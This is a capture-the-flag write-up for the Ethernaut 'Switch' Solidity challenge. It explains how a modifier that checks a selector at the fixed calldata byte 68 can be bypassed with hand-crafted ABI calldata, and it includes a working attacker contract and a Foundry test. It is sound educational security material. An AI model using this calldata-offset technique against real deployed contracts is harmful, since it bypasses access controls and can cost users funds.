# Ethernaut Challenge 29 — Switch

This level contains a bug when creating the instance on Ethernaut, discussed here:

https://github.com/OpenZeppelin/ethernaut/issues/837

As a result, I was not able to create an instance of the contract on the platform.  
I solved the challenge locally using the test file [SwitchTest.t.sol](../../test/challenge-29-switch/SwitchTest.t.sol).

---

## 🎯 Goal

Turn the switch on by calling `turnSwitchOn()`, while still passing the `onlyOff` modifier inside `flipSwitch(bytes)`.

---

## 🧠 Key idea

The contract checks the calldata at a **fixed byte position** instead of properly decoding the `_data` argument.

That allows us to craft calldata where:

* the modifier sees the selector of `turnSwitchOff()`
* the actual internal call executes `turnSwitchOn()`

---

## 🔍 Relevant contract logic

```solidity
modifier onlyOff() {
    bytes32[1] memory selector;
    assembly {
        calldatacopy(selector, 68, 4)
    }
    require(selector[0] == offSelector, "Can only call the turnOffSwitch function");
    _;
}

function flipSwitch(bytes memory _data) public onlyOff {
    (bool success,) = address(this).call(_data);
    require(success, "call failed :(");
}
```

The important part is this line:

```solidity
calldatacopy(selector, 68, 4)
```

It:

1. reads 4 bytes from calldata starting at byte `68`
2. stores them in memory
3. compares them against `offSelector`

So the modifier does **not** decode `_data` properly. It just assumes that the selector it wants to check is always located at byte `68`.

That assumption is wrong.

---

## 🧪 Function selectors

Selector of `turnSwitchOn()`:

```bash
cast sig "turnSwitchOn()"
```

Result:

```text
0x76227e12
```

Selector of `turnSwitchOff()`:

```bash
cast sig "turnSwitchOff()"
```

Result:

```text
0x20606e15
```

Selector of `flipSwitch(bytes)`:

```bash
cast sig "flipSwitch(bytes)"
```

Result:

```text
0x30c13ade
```

---

## 💥 Exploit strategy

We manually craft the full calldata for `flipSwitch(bytes)`.

We want two things at the same time:

* at byte `68`, the modifier must read `turnSwitchOff()`
* the real `_data` passed to `address(this).call(_data)` must be `turnSwitchOn()`

To do that, we:

* place `offSelector` exactly at byte `68`
* use the offset field to make Solidity decode the real `_data` later in calldata
* place the real `_data` there as:

  * 32 bytes length
  * 4 bytes `onSelector`

---

## 🧱 Custom calldata

```solidity
bytes memory customCalldata = bytes.concat(
    flipSelector,
    bytes32(uint256(96)),        // offset to real _data
    bytes32(0),                  // filler
    bytes.concat(offSelector, new bytes(28)),
    bytes32(uint256(4)),         // real _data length
    bytes.concat(onSelector)     // actual call
);
```

---

## 📦 Calldata layout

```text
[ flipSelector ]
[ offset = 96 ]                     -> points to the real _data
[ filler (32 bytes) ]
[ offSelector + 28 bytes padding ] -> checked by onlyOff at byte 68
[ real length = 4 ]
[ onSelector ]                     -> actually executed
```

More explicitly:

```text
0..3      -> flipSelector
4..35     -> offset = 96
36..67    -> filler
68..99    -> offSelector + padding
100..131  -> real length = 4
132..135  -> onSelector
```

---

## 🧠 Why offset is `96`

In ABI encoding, the offset for a dynamic argument is measured from the start of the arguments block, which begins immediately after the 4-byte function selector.

So:

* arguments block starts at byte `4`
* real `_data` starts at byte `100`

That means:

```text
100 - 4 = 96
```

So the correct offset is `96` (`0x60`).

---

## 🚀 Attacker contract

The attacker contract that solves the challenge is [SwitchAttacker.sol](./SwitchAttacker.sol):

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Switch} from "./Switch.sol";

contract SwitchAttacker {
    bytes4 constant onSelector = Switch.turnSwitchOn.selector;
    bytes4 constant offSelector = Switch.turnSwitchOff.selector;
    bytes4 constant flipSelector = Switch.flipSwitch.selector;

    Switch public switchContract;

    constructor(address _switch) {
        switchContract = Switch(_switch);
    }

    function attack() public {
        bytes memory customCalldata = bytes.concat(
            flipSelector,
            bytes32(uint256(96)),
            bytes32(0),
            bytes.concat(offSelector, new bytes(28)),
            bytes32(uint256(4)),
            bytes.concat(onSelector)
        );

        (bool success,) = address(switchContract).call(customCalldata);
        require(success, "Failed Attack");
    }
}
```

---

## ✅ Test

The test file [SwitchTest.t.sol](../../test/SwitchTest.t.sol) simply asserts that the attack was successful:

```solidity
function testAttack() public {
    attacker.attack();
    assertTrue(switchContract.switchOn());
}
```

